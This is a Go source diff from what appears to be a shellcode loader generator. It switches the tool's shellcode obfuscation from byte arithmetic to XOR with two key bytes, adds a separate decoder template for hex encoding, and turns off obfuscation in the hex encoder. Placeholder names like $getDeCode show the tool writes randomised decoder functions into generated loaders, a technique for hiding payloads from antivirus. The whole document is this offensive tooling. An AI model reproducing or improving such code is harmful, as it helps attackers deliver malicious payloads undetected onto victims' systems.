@@ -57,8 +57,15 @@ func $getDeCode(string2 string) []byte {
 	var code []byte
 	bydata := []byte(string2)
 	for i := 0; i < len(bydata); i++ {
-		code = append(code, bydata[i]-$keyName[0]+$keyName[1])
+		code = append(code, bydata[i]^$keyName[0]^$keyName[1])
 	}
+	ssb, _ := $encode$.DecodeString(string(code))
+	return ssb
+}
+`
+
+var decodeMethod1 = `
+func $getDeCode(code string) []byte {
 	ssb, _ := $encode$.DecodeString(string(code))
 	return ssb
 }
@@ -117,17 +124,17 @@ func getBase64EnCode(data []byte) string {
 	var shellcode []byte
 
 	for i := 0; i < len(bydata1); i++ {
-		shellcode = append(shellcode, bydata1[i]+key[0]-key[1])
+		shellcode = append(shellcode, bydata1[i]^key[0]^key[1])
 	}
 	return base64.StdEncoding.EncodeToString(shellcode)
 }
 
 func getHexEnCode(data []byte) string {
-	var shellcode []byte
-	for i := 0; i < len(data); i++ {
-		shellcode = append(shellcode, data[i]+key[0]-key[1])
-	}
-	return hex.EncodeToString(shellcode)
+	/*	var shellcode []byte
+		for i := 0; i < len(data); i++ {
+			shellcode = append(shellcode, data[i]^key[0]^key[1])
+		}*/
+	return hex.EncodeToString(data)
 }
 
 func gen(code *string) {
@@ -217,6 +224,7 @@ func main() {
 	//根据编码生成shellcode
 	if encodeVal == "hex" {
 		shellcodeStr = getHexEnCode(sc)
+		decodeMethod = decodeMethod1
 		decodeMethod = strings.ReplaceAll(decodeMethod, "$encode$", "hex")
 	} else {
 		shellcodeStr = getBase64EnCode(sc)
